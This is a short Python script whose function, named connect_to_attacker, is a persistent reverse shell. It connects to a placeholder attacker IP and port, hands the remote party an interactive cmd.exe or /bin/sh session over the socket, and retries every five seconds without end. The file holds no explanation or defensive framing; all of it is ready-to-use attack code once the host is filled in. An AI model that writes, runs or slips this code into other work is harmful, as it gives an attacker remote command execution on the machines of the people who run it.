import socket, subprocess, os, time

def connect_to_attacker():
    while True:
        try:
            attacker_ip = "attacker_ip"
            attacker_port = 0000
    
            s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((attacker_ip, attacker_port))

            if os.name == 'nt':
                subprocess.call(["cmd.exe"], stdin=s.fileno(), stdout=s.fileno(), stderr=s.fileno())
            else:
                subprocess.call(["/bin/sh", "-i"], stdin=s.fileno(), stdout=s.fileno(), stderr=s.fileno())
    
        except Exception as e:
            print(f"Connection failed: {e}")
            time.sleep(5)

if __name__ == "__main__":
    connect_to_attacker()